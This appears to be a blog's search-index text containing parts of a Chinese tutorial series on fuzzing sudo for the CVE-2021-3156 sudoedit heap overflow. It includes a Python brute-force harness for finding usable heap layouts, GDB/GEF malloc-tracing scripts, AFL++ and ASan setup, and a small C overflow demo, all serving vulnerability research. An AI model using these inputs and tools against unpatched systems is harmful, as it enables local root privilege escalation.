核心思想是随机输入到sudoedit，然后调用上节找到的函数时，打印该函数指针和打印堆溢出的chunk 改写sudo源码 真实环境下的sudo和测试下的sudo是两个二进制文件，为了贴近正式的环境，要尽量的贴近真实情况下的sudo 添加打印参数Chunk地址 已上一节的红黑树为例，打印compar的值 忘写分号了 12./configure &amp;&amp; makeln -s /pwd/sudo_test/src/.libs/sudo ./src/.libs/sudoedit 作者在这里踩了坑，我想复现下，不想看的可以略过 虽然报错的方式不一样，但是结果和原因都是一样的。一个都是libsudo这个库找不到，作者的问题是使用的是系统变量中的库，但是这个库不含有printf即其他输出，自然也就没法打印字符串 &gt;&gt;问题 没有反应 找找是不是代码写的文件是其他文件的代码 所以使用make install安装方法就好了，只要之前make过一次之后就都可以了 堆溢出发生时，程序并不会立即crash，而是会进入到红黑树的部分，但是能溢出的user_args地址在rbtree1地址后面，所以依然无法利用 暴力测试脚本 尝试构造不同的输入，看看能不能有路径可以把函数指针放在我们能溢出的chunk后面的 输入来源 stdin 文件(files) 协议参数(arguments) 环境变量(env vars) 设置长度 123456# define some common size values usable for different inputs_SIZES = [i for i in range(0,0xff)]_SIZES += [2**i for i in range(0,15)]_SIZES += [(2**i)+1 for i in range(0,15)]_SIZES += [(2**i)-1 for i in range(0,15)]_SIZES += ([0]*50) sudo参数协议(sudo help) 1234567# define some flags from sudo -hARG1 = [&quot;-A&quot;,&quot;-B&quot;,&quot;-E&quot;,&quot;-e&quot;,&quot;-H&quot;,&quot;-K&quot;,&quot;-k&quot;,&quot;-l&quot;,&quot;-n&quot;,&quot;-P&quot;,&quot;-S&quot;,&quot;-s&quot;]ARG1 += [None, None, None, None, None, None, None]ARG2 = _SIZESARG3 = _SIZESHOSTNAME = _SIZESENV = _SIZES 设置测试集 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# dump a testcase into a logfiledef dump_file(fname, lines, ptrs, arg, env, key): # create the folders if they don&#x27;t exist directory = os.path.dirname(fname) if not os.path.exists(directory): os.makedirs(directory) # don&#x27;t write the dump file if it&#x27;s already too large if os.path.isfile(fname) and Path(fname).stat().st_size &gt; 200000: return # write to file with open(fname, &#x27;a+&#x27;) as f: f.write(&quot;----------------------------\\n&quot;) f.write(lines[1].decode(&#x27;ascii&#x27;)) if key: distance = ptrs[key] - ptrs[b&#x27;user_args&#x27;] f.write(f&quot;user_args &lt; &#123;key.decode(&#x27;ascii&#x27;)&#125;\\n&quot;) f.write(f&quot;distance: 0x&#123;distance:x&#125;\\n&quot;) if key: f.write(f&quot;0x&#123;ptrs[b&#x27;user_args&#x27;]:016x&#125; &lt; 0x&#123;ptrs[key]:016x&#125;\\n&quot;) f.write(&quot;args: sudoedit &quot;) f.write(&quot; &quot;.join(arg)) f.write(&quot;\\n\\n&quot;) for k in env: f.write(f&quot;&#123;k&#125;=&#123;env[k]&#125;\\n&quot;) f.write(&quot;\\n&quot;) f.write(lines[0].decode(&#x27;ascii&#x27;)) f.write(&quot;\\n&quot;) test = &#123;&#125; test[&#x27;arg&#x27;] = arg test[&#x27;env&#x27;] = env f.write(json.dumps(test)) f.write(&quot;\\n\\n&quot;)# this will run sudoedit with a set of arguments and environment variablesdef run_sudoedit(arg, env): print(&quot;-------------&quot;) # disable stdout buffering with stdbuf wrapping around sudoedit # and add the commandline arguments _cmd = [&quot;/usr/bin/stdbuf&quot;, &quot;-o0&quot;, &quot;/usr/local/bin/sudoedit&quot;] + arg # execute it p = subprocess.Popen(_cmd, env=env, bufsize=0, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) try: # send some newlines and check if we get any output lines = p.communicate(b&quot;x\\nx\\nx\\nx\\n&quot;, timeout=0.1) except subprocess.TimeoutExpired: # terminate on timeout p.terminate() lines = p.communicate() if p.returncode == -11: print(f&quot;SEGFAULT&quot;) # read the list of function pointers ptrs = &#123;&#125; skipping = True for line in lines[0].splitlines(): key,val = line.split(b&#x27;=&#x27;) if key == b&#x27;user_args&#x27;: skipping = False if not skipping: ptrs[key] = int(val,16) # go through all function pointers if ptrs and b&#x27;user_args&#x27; in ptrs: for key in ptrs: if key != b&#x27;user_args&#x27;: # is our overflow buffer before a function pointer? if ptrs[b&#x27;user_args&#x27;] &lt; ptrs[key]: distance = ptrs[key] - ptrs[b&#x27;user_args&#x27;] if distance&lt;14000: fname = f&#x27;&#123;FOLDER&#125;/&#123;distance&#125;&#x27; dump_file(fname, lines, ptrs, arg, env, key) # did we get a segfault? if p.returncode == -11: fname = f&quot;&#123;FOLDER&#125;/crashes/segfault_&#123;distance&#125;&quot; dump_file(fname, lines, ptrs, arg, env, None) return returnALPHABET = &#x27;0123456789ABCDEFGHIKLMNOPQRSTUVWXYZ&#x27; fuzz主要功能 12345678910111213141516171819202122232425262728# fuzz loopwhile True: # select random size values arg1 = random.choice(ARG1) rand_arg2_size = random.choice(ARG2) rand_arg3_size = random.choice(ARG3) rand_hostname_size = random.choice(HOSTNAME) rand_env_size = random.choice(ENV) arg = [] env = &#123;&#125; # arguments # ... -s AAAAAAA\\ ... if arg1: arg.append(arg1) arg.append(&quot;-s&quot;) arg.append(random.choice(ALPHABET)*rand_arg2_size + &quot;\\\\&quot;) if rand_arg3_size: arg.append(random.choice(ALPHABET)*rand_arg3_size) # environment variables if rand_hostname_size: env[&quot;HOSTNAME&quot;] = random.choice(ALPHABET)*rand_hostname_size if rand_env_size: env[random.choice(ALPHABET)*3] = random.choice(ALPHABET)*rand_env_size # run sudoedit run_sudoedit(arg, env) 开始fuzz 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# this will run sudoedit with a set of arguments and environment variablesdef run_sudoedit(arg, env): print(&quot;-------------&quot;) # disable stdout buffering with stdbuf wrapping around sudoedit # and add the commandline arguments _cmd = [&quot;/usr/bin/stdbuf&quot;, &quot;-o0&quot;, &quot;/usr/local/bin/sudoedit&quot;] + arg # execute it p = subprocess.Popen(_cmd, env=env, bufsize=0, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) try: # send some newlines and check if we get any output lines = p.communicate(b&quot;x\\nx\\nx\\nx\\n&quot;, timeout=0.1) except subprocess.TimeoutExpired: # terminate on timeout p.terminate() lines = p.communicate() if p.returncode == -11: print(f&quot;SEGFAULT&quot;) # read the list of function pointers ptrs = &#123;&#125; skipping = True for line in lines[0].splitlines(): key,val = line.split(b&#x27;=&#x27;) if key == b&#x27;user_args&#x27;: skipping = False if not skipping: ptrs[key] = int(val,16) # go through all function pointers if ptrs and b&#x27;user_args&#x27; in ptrs: for key in ptrs: if key != b&#x27;user_args&#x27;: # is our overflow buffer before a function pointer? if ptrs[b&#x27;user_args&#x27;] &lt; ptrs[key]: distance = ptrs[key] - ptrs[b&#x27;user_args&#x27;] if distance&lt;14000: fname = f&#x27;&#123;FOLDER&#125;/&#123;distance&#125;&#x27; dump_file(fname, lines, ptrs, arg, env, key) # did we get a segfault? if p.returncode == -11: fname = f&quot;&#123;FOLDER&#125;/crashes/segfault_&#123;distance&#125;&quot; dump_file(fname, lines, ptrs, arg, env, None) return return 最后发现chunk位置相差太远不同 ，根本无法利用 GDB工具编写 阶段 1 要改进上面的暴力脚本，就要知道我对的分配情况，我们也可以在gdb里面在每次malloc下断点查看size参数。 更为便捷的技巧是查看free时候的指针的地址的值，如果是我们认识的字符串，那么我们就能控制到哪里 123456789set breakpoint pending onbreak freecommands silent printf &quot;free(): %s\\n&quot;,$rdi continueendrun -s &#x27;SSSSSSSSSSSSSSSSSSSSSYYY\\&#x27; 运行 1gdb -x ./gdb.init /usr/local/bin/sudoedit &gt; free_trace 发现有环境变量，再次尝试设置环境变量 发现根本没变，要是我们尝试更多的环境变量呢？ 阶段 2 直接在加载环境变量（getenv(3p)）的时候下断点，看看用了那些 12345678910set breakpoint pending onbreak getenvcommands silent printf &quot;getenv(): %s\\n&quot;,$rdi continueendrun -s &#x27;SSSSSSSSSSSSSSSSSSSSSYYY\\&#x27; 发现可以设置的环境变量值 再次改写脚本 12345678910111213141516171819202122232425262728set breakpoint pending onset environment LOCPATH = HEAP0set environment LC_ALL = HEAP1set environment LC_IDENTIFICATION = HEAP2set environment LANG = HEAP3set environment LC_MEASUREMENT = HEAP4set environment LC_TELEPHONE = HEAP5set environment LC_ADDRESS = HEAP6set environment LC_NAME = HEAP7set environment LC_PAPER = HEAP8set environment LC_MESSAGES = HEAP9set environment LC_MONETARY = HEAPAset environment LC_COLLATE = HEAPBset environment LC_TIME = HEAPCset environment LC_NUMERIC = HEAPDset environment LC_CTYPE = HEAPEset environment GCONV_PATH = HEAPFset environment TZ = HEAPGset environment SHELL = HEAPIbreak freecommands silent printf &quot;free(): %s\\n&quot;,$rdi continueendrun -s &#x27;SSSSSSSSSSSSSSSSSSSSSYYY\\&#x27; 所以可以从这些地方下手来构建更好的暴力测试工具，同时作者也在第一份暴力测试工具中犯了很多错误。用github上的改进版本能快速找到能利用的点 或许利用点在于覆写环境变量？ 阶段 3 这时里exp还很远，也可以尝试下分析堆溢出过后还有哪些地方申请 作者直接写了一个gef的拓展工具 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149# gdb -ex &#x27;gef config gef.extra_plugins_dir &quot;/pwd/gef&quot;&#x27; -ex &#x27;gef save&#x27; -ex quit__AUTHOR__ = &quot;liveoverflow&quot;__VERSION__ = 0.1import collectionsimport gdbimport json# persist &quot;database&quot; to the filedef dump(j): with open(&#x27;/tmp/malloc.json&#x27;, &#x27;w&#x27;) as f: f.write(json.dumps(j))# load &quot;database&quot; from the filedef load(): with open(&#x27;/tmp/malloc.json&#x27;, &#x27;r&#x27;) as f: j = json.loads(f.read()) return j# handler for malloc() breakpointsclass MallocBreakpoint(gdb.Breakpoint): def __init__(self, location, *args, **kwargs): super(MallocBreakpoint, self).__init__(location, gdb.BP_BREAKPOINT, internal=False) self.silent = True self.size = None self.addr = None return # malloc() breakpoint triggered def stop(self): log = &#123;&#125; # extract information about this malloc() log[&quot;size&quot;] = get_register(&quot;$rdi&quot;) log[&quot;rip&quot;] = get_register(&quot;$rip&quot;) log[&quot;backtrace&quot;] = gdb.execute(&#x27;bt&#x27;, to_string=True) log[&#x27;name&#x27;] = gdb.newest_frame().older().name() # set a breakpoint at the malloc() return if log[&#x27;name&#x27;] and &#x27;set_cmnd&#x27; in log[&#x27;name&#x27;]: self.retbp = MallocReturnBreakpoint(log=log, overwrite=gdb.newest_frame().older()) return False self.retbp = MallocReturnBreakpoint(log=log) return False# breakpoint for the return of a malloc()class MallocReturnBreakpoint(gdb.FinishBreakpoint): def __init__(self, log, overwrite=False, *args, **kwargs): if not overwrite: overwrite = gdb.newest_frame() super(MallocReturnBreakpoint, self).__init__(overwrite, internal=False) self.silent = False self.log = log def stop(self): # extract some information self.log[&#x27;addr&#x27;] = get_register(&quot;$rax&quot;) self.log[&#x27;name&#x27;] = gdb.newest_frame().name() # load the mallocs() we logged before MALLOCS = load() # add this malloc to the known allocations MALLOCS[str(self.log[&#x27;addr&#x27;])] = self.log dump(MALLOCS) # this is the location of our overflowing buffer # now we can dump the heap analysis if self.log[&#x27;name&#x27;] and &#x27;set_cmnd&#x27; in self.log[&#x27;name&#x27;]: print(&quot;YYYYYYYYYYY WE ARE IN!!!&quot;) addr = get_register(&quot;$rax&quot;) mallocs = [int(a) for a in MALLOCS] mallocs.sort() SHOW = 5 out = &#x27;&#x27; for mall in mallocs: if mall &gt; addr and SHOW&gt;0: h = MALLOCS[str(mall)] for line in h[&#x27;backtrace&#x27;].split(&#x27;\\n&#x27;)[1:]: if line: l = line.split() print(l) if l[3] != &#x27;??&#x27;: out += (l[3]) + &quot; &quot; out += &quot;\\n&quot; SHOW -= 1 out += &quot;\\n&quot; print(out) with open(&#x27;/tmp/heap&#x27; ,&#x27;w&#x27;) as f: f.write(out) return True return False# set a breakpoint on free()class FreeBreakpoint(gdb.Breakpoint): def __init__(self, location, *args, **kwargs): super(FreeBreakpoint, self).__init__(location, gdb.BP_BREAKPOINT, internal=False) self.silent = True self.size = None self.malloc = [] self.addr = None return def stop(self): log = &#123;&#125; log[&quot;addr&quot;] = get_register(&quot;$rdi&quot;) # check if the memory freed was allocated before MALLOCS = load() if str(log[&quot;addr&quot;]) in MALLOCS: # remove this object from the list of allocated objects del MALLOCS[str(log[&quot;addr&quot;])] dump(MALLOCS) return False# the gdb command that starts the heap traceclass SudoeditCommand(GenericCommand): &quot;&quot;&quot;Tracks a function given in parameter for arguments and return code.&quot;&quot;&quot; _cmdline_ = &quot;sudoedit&quot; _syntax_ = f&quot;&#123;_cmdline_&#125;&quot; def do_invoke(self, args): dump(&#123;&#125;) self.bkps = [] # set the breakpoints self.bkps.append(MallocBreakpoint(location=&quot;__libc_malloc&quot;)) self.bkps.append(FreeBreakpoint(location=&quot;__libc_free&quot;)) #self.bkps.append(MallocBreakpoint(location=&quot;malloc&quot;)) #self.bkps.append(ReallocBreakpoint(location=&quot;__libc_calloc&quot;)) #self.bkps.append(ReallocBreakpoint(location=&quot;__libc_realloc&quot;)) #self.bkps.append(FreeBreakpoint(location=&quot;free&quot;)) gdb.events.exited.connect(self.cleanup) return def cleanup(self, events): print(&quot;CLEANUP!!!&quot;) for bp in self.bkps: bp.delete() gdb.events.exited.disconnect(self.cleanup) returnif __name__ == &quot;__main__&quot;: register_external_command(SudoeditCommand()) 设置插件 1gdb -ex &#x27;gef config gef.extra_plugins_dir &quot;/pwd/gef2&quot;&#x27; -ex &#x27;gef save&#x27; -ex quit 使用 1gdb -ex &#x27;set breakpoint pending on&#x27; -ex &#x27;sudoedit&#x27; -ex &#x27;r -s xxxxxxxxxxxxxxxxxx&#x27; -ex &#x27;sudoedit&#x27; -ex &#x27;continue&#x27; /usr/local/bin/sudoedit | tee heap.log 主要就是跟踪malloc和free在堆溢出之后的行为 只有将这个改写到暴力脚本里面，找到符合条件的Chunk","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"}]},{"title":"SUDO堆溢出提权：从fuzz到exp [2]","slug":"sudo-fuzz2exp-2","date":"2022-04-13T03:12:03.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2022/04/13/sudo-fuzz2exp-2/","link":"","permalink":"https://joe1sn.eu.org/2022/04/13/sudo-fuzz2exp-2/","excerpt":"前文：https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ 受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程 原始视频合集：https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx 原始Blog：https://liveoverflow.com/why-pick-sudo-research-target-part-1/ 原作者代码仓库：https://github.com/LiveOverflow/pwnedit","text":"前文：https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ 受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程 原始视频合集：https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx 原始Blog：https://liveoverflow.com/why-pick-sudo-research-target-part-1/ 原作者代码仓库：https://github.com/LiveOverflow/pwnedit My previous blog: https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ I was inspired by the LiveOverflow’s Sudo Vulnerability Walkthrough on youtube, but i found there’s no Chinese version of this walkthrough tutorial, so i decided to write in experimental report way to create this “from fuzz to exploit” series. Original Videos: https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx Original Blog: https://liveoverflow.com/why-pick-sudo-research-target-part-1/ Source Project Code: https://github.com/LiveOverflow/pwnedit 本节内容： Troubleshooting AFL Fuzzing Problems | Ep. 03 Finding Buffer Overflow with Fuzzing | Ep. 04 Found a Crash Through Fuzzing? Minimize AFL Testcases! | Ep. 05 Root Cause Analysis With AddressSanitizer (ASan) | Ep. 06 Understanding C Pointer Magic Arithmetic | Ep. 07 C Code Review - Reaching Vulnerable Code in sudo | Ep. 08 解决AFL的小麻烦 因为时间原因，我并不能一直开着电脑跑，不过我翻译一下作者遇到的问题 No more free CPU cores 作者在遇到fuzz很慢的时候，尝试关闭一个fuzz，然后重启 然后使用ps aux产看全部运行过程，发现afl在尝试fuzz这些奇怪的东西（因为sudo中可能会有exec之类的）。然后pkill vi关闭所有vi的进程就短暂的解决了这个问题。 **解决：**彻底解决的话要关闭所有在sudo中的exec相关函数，然后重新编译 And of Disk Space 作者查看空间使用情况过后发现磁盘空间充足，但是任然不能创建文件 但是使用df -i查看inode节点，发现被占满了 **inode (index node)**是指在许多“类Unix文件系统”中的一种数据结构，用于描述文件系统对象（包括文件、目录、设备文件、socket、管道等）。每个inode保存了文件系统对象数据的属性和磁盘块位置[1]。文件系统对象属性包含了各种元数据（如：最后修改时间） ，也包含用户组（owner ）和权限数据 说明有过多的细小文件使用光了inode节点号，最后在/var/tmp找到了这些文件，原因是fuzz的时候产生了例如../../的路径穿越。 **解决：**手动在sudo要创建文件的时候添加上一个crash，这里用空指针引用 12printf(&quot;mk tmp file(%s)\\n&quot;,stuff);*(int *)0=0; 之后开始fuzz 然后分析crash 但是又引入了新的问题： root和普通用户相同吗？ 这里就要说到sudo的原理，sudo是通过在root条件下使用setuid的方式来让普通用户指令得到root执行。 比如我们在user下fuzz，但是真实情况会将它变为root下运行 如果要在fuzz时实现真实情况的效果，那么就要将当前用户uid设置为普通用户的 sudo-1.8.31p2/src/sudo.c get_user_info 1234ud-&gt;uid = 1000//getuid();ud-&gt;euid = geteuid();ud-&gt;gid = 1000//getgid();ud-&gt;egid = getegid(); 忘写分号了 找到缓冲区溢出 作者用上一节的fuzz得到了一些ctash样本，本章内容讲的基本上是分析这些样本 gdb调试 和我预料的一样，这样做会产生大量的非sudo从而crash的样本，可以用以下命令查看 12grep -R sudoedit file_floder/grep -R sudo file_floder/ 为了方便分析，可以安装一些gdb的插件，如pwndbg，也在CVE分析的文章里讲过了该插件的安装(不要放在共享文件夹/pwd下安装) 有的crash是由于fuzzer的错误引起的，作者使用了这段代码判断 1234567#include &quot;argv-fuzz-inl.h&quot;int main(int argc, char *argv[], char *envp[])&#123; AFL_INIT_ARGV(); // argv is now the fake argv execve(&quot;/usr/local/bin/sudo&quot;, argv, envp);&#125; 作者遇到的第一个问题是argv-fuzz-inl中的ret数组造成的栈溢出，覆写了其他的函数指针造成crash 解决 如果rc比最大参数数量大时退出循环 更换fuzzer 使用更好的fuzzer：AFL++ 项目地址：https://github.com/AFLplusplus/AFLplusplus AFL++支持对命令行的fuzz，所以之前的修改要去掉 要新建镜像的话，可以在Dockerfile中加上 1RUN cd /root/ &amp;&amp; git clone https://github.com/AFLplusplus/AFLplusplus &amp;&amp; cd AFLplusplus &amp;&amp; make source-only &amp;&amp; make install 1234567891011FROM ubuntu:20.04ENV LC_CTYPE C.UTF-8ARG DEBIAN_FRONTEND=noninteractiveRUN apt-get update &amp;&amp; apt-get install -yq gcc make wget curl git vim gdb clang llvm lld llvm-dev bsdmainutils libstdc++-10-dev python3 python3-pip python3-dev automake flex bison build-essential libglib2.0-dev libpixman-1-dev python3-setuptools RUN cd /root/ &amp;&amp; wget https://www.sudo.ws/dist/sudo-1.8.31p2.tar.gz &amp;&amp; tar -xvf sudo-1.8.31p2.tar.gz &amp;&amp; cd sudo-1.8.31p2 &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make installRUN cd /root/ &amp;&amp; git clone https://github.com/AFLplusplus/AFLplusplus &amp;&amp; cd AFLplusplus &amp;&amp; make source-only &amp;&amp; make installRUN useradd -ms /bin/bash userRUN echo &#x27;export PS1=&quot;\\[\\e]0;\\u@\\h: \\w\\a\\]\\[\\033[01;31m\\]\\u\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]# &quot;&#x27; &gt;&gt; /root/.bashrcRUN echo &#x27;export PS1=&quot;\\[\\e]0;\\u@\\h: \\w\\a\\]\\[\\033[01;32m\\]\\u\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]$ &quot;&#x27; &gt;&gt; /home/user/.bashrcUSER userWORKDIR /home/user 重新编译 123whereis afl-clang-fastls -lah /usr/local/bin/afl-clang-fastCC=afl-cc ./configure --disable-shared &amp;&amp; make -j8 开始fuzz，指令-T参数可以指定argv[0] 1afl-fuzz -i /tmp/in/ -o /tmp/out/ -T sudoedit ./src/sudo 我这里故意放了能够引起crash的样本进去只为了加速过程 分析新的crash 判断是否为误报 我直接使用作者的crash文件，你可以在：https://github.com/LiveOverflow/pwnedit/tree/main/episode05 中找到 id_000000,sig_06,src_000083+000451,time_23448104,op_splice,rep_8 ​ 检验下在我的环境里面是否会有crash root user gdb调试 原视频里面用的是GEF，这里我用pwndbg，新人(没有CTFpwn经验)建议用GEF 程序自动运行后停止了 说明这个错误是被malloc给抛出的 **这会是一个新的0day吗？**在最新平台上测试后发现并不是 简化crash 其实我做到这一步想到的是用afl-tmin，后来发现作者尝试其他方案失败后，我就直接用afl-tmin了 在user下检验 创建软链接 12ln -s /usr/local/bin/sudo 0editls -lah 0edit 运行测试 有趣的发现 结尾是xedit这种形式就可以调用sudoedit 使用ASAN分析漏洞 asan一直是一个很操蛋的工具，经常报错，作者也在这里报错很多，我也是直接展示正常（正常报错）做法 1make clean &amp;&amp; ./configure CFLAGS=&quot;-fsanitize=address,undefined -g&quot; LDFLAGS=&quot;-fsanitize=address,undefined&quot; CC=clang --disable-shared &amp;&amp; make -j8 送入mini_crash样例检测 如果没有加上--disable-shared的话，就算有-g参数，也不会知道具体代码在哪里 现在我们知道漏洞的位置在/plugins/sudoers/./sudoers.c:868的set_cmnd函数内 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110static intset_cmnd(void)&#123; struct sudo_nss *nss; char *path = user_path; int ret = FOUND; debug_decl(set_cmnd, SUDOERS_DEBUG_PLUGIN) /* Allocate user_stat for find_path() and match functions. */ user_stat = calloc(1, sizeof(struct stat)); if (user_stat == NULL) &#123; sudo_warnx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); debug_return_int(NOT_FOUND_ERROR); &#125; /* Default value for cmnd, overridden below. */ if (user_cmnd == NULL) user_cmnd = NewArgv[0]; if (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; if (ISSET(sudo_mode, MODE_RUN | MODE_CHECK)) &#123; if (def_secure_path &amp;&amp; !user_is_exempt()) path = def_secure_path; if (!set_perms(PERM_RUNAS)) debug_return_int(-1); ret = find_path(NewArgv[0], &amp;user_cmnd, user_stat, path, def_ignore_dot, NULL); if (!restore_perms()) debug_return_int(-1); if (ret == NOT_FOUND) &#123; /* Failed as root, try as invoking user. */ if (!set_perms(PERM_USER)) debug_return_int(-1); ret = find_path(NewArgv[0], &amp;user_cmnd, user_stat, path, def_ignore_dot, NULL); if (!restore_perms()) debug_return_int(-1); &#125; if (ret == NOT_FOUND_ERROR) &#123; if (errno == ENAMETOOLONG) audit_failure(NewArgc, NewArgv, N_(&quot;command too long&quot;)); log_warning(0, &quot;%s&quot;, NewArgv[0]); debug_return_int(ret); &#125; &#125; /* set user_args */ if (NewArgc &gt; 1) &#123; char *to, *from, **av; size_t size, n; /* Alloc and build up user_args. */ for (size = 0, av = NewArgv + 1; *av; av++) size += strlen(*av) + 1; if (size == 0 || (user_args = malloc(size)) == NULL) &#123; sudo_warnx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); debug_return_int(-1); &#125; if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; /* * When running a command via a shell, the sudo front-end * escapes potential meta chars. We unescape non-spaces * for sudoers matching and logging purposes. */ for (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123; while (*from) &#123; if (from[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)from[1])) from++; *to++ = *from++; &#125; *to++ = &#x27; &#x27;; &#125; *--to = &#x27;\\0&#x27;; &#125; else &#123; for (to = user_args, av = NewArgv + 1; *av; av++) &#123; n = strlcpy(to, *av, size - (to - user_args)); if (n &gt;= size - (to - user_args)) &#123; sudo_warnx(U_(&quot;internal error, %s overflow&quot;), __func__); debug_return_int(-1); &#125; to += n; *to++ = &#x27; &#x27;; &#125; *--to = &#x27;\\0&#x27;; &#125; &#125; &#125; if ((user_base = strrchr(user_cmnd, &#x27;/&#x27;)) != NULL) user_base++; else user_base = user_cmnd; /* Convert &quot;sudo sudoedit&quot; -&gt; &quot;sudoedit&quot; */ if (ISSET(sudo_mode, MODE_RUN) &amp;&amp; strcmp(user_base, &quot;sudoedit&quot;) == 0) &#123; CLR(sudo_mode, MODE_RUN); SET(sudo_mode, MODE_EDIT); sudo_warnx(U_(&quot;sudoedit doesn&#x27;t need to be run via sudo&quot;)); user_base = user_cmnd = &quot;sudoedit&quot;; &#125; TAILQ_FOREACH(nss, snl, entries) &#123; if (!update_defaults(nss-&gt;parse_tree, NULL, SETDEF_CMND, false)) &#123; log_warningx(SLOG_SEND_MAIL|SLOG_NO_STDERR, N_(&quot;problem with defaults entries&quot;)); &#125; &#125; debug_return_int(ret);&#125; 漏洞造成的原因在CVE那篇文章分析过了 简化漏洞模型 这里的视角更像是给CTF出题，我也确实一句这个漏洞出过一道，不过在这里我们后面会完成exp的编写，所以只写c程序分析就行了 精简一下上面的源代码，问题出现在这里 1234567891011if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; for (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123; while (*from) &#123; if (from[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)from[1])) from++; *to++ = *from++; &#125; *to++ = &#x27; &#x27;; &#125; *--to = &#x27;\\0&#x27;;&#125; 如果最后一个参数是\\的话，from++， 然后*to++ = *from++，此时的from指针就超出了边界，造成堆溢出 可以写一个小的例子调试一下 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;ctype.h&gt;#include &lt;string.h&gt;int main()&#123; char from[100]; puts(&quot;please input some data, max is 100&quot;); read(0,from,100); int len = strlen(from); char *src = from; char *to = (char *)malloc(len); char *dst = to+1; puts(&quot;start copy file&quot;); while(*src)&#123; if (src[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)src[1])) src++; *dst++ = *src++; &#125; *to++ = &#x27;\\n&#x27;; printf(&quot;src&gt; %s&quot;,from); printf(&quot;dst&gt; %s&quot;,to);&#125; 构造这样的特殊输入，在输入的时候已经输入0x18个字符串了，所以是malloc(0x18) 按照程序的效果，会将下一个chunk的头部份覆写为0xbbbbbbbb 成功覆盖掉，实现预期堆溢出的目标，说明当结尾的反斜杠后面还有数据的时候会产生堆溢出","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"}]},{"title":"SUDO堆溢出提权：从fuzz到exp [1]","slug":"sudo-fuzz2exp-1","date":"2022-04-11T02:40:44.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2022/04/11/sudo-fuzz2exp-1/","link":"","permalink":"https://joe1sn.eu.org/2022/04/11/sudo-fuzz2exp-1/","excerpt":"前文：https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ 受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程 原始视频合集：https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx 原始Blog：https://liveoverflow.com/why-pick-sudo-research-target-part-1/ 原作者代码仓库：https://github.com/LiveOverflow/pwnedit","text":"前文：https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ 受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程 原始视频合集：https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx 原始Blog：https://liveoverflow.com/why-pick-sudo-research-target-part-1/ 原作者代码仓库：https://github.com/LiveOverflow/pwnedit My previous blog: https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ I was inspired by the LiveOverflow’s Sudo Vulnerability Walkthrough on youtube, but i found there’s no Chinese version of this walkthrough tutorial, so i decided to write in experimental report way to create this “from fuzz to exploit” series. Original Videos: https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx Original Blog: https://liveoverflow.com/why-pick-sudo-research-target-part-1/ Source Project Code: https://github.com/LiveOverflow/pwnedit 本节内容： Why Pick sudo as Research Target? | Ep. 01 How Fuzzing with AFL works! | Ep. 02 环境搭建 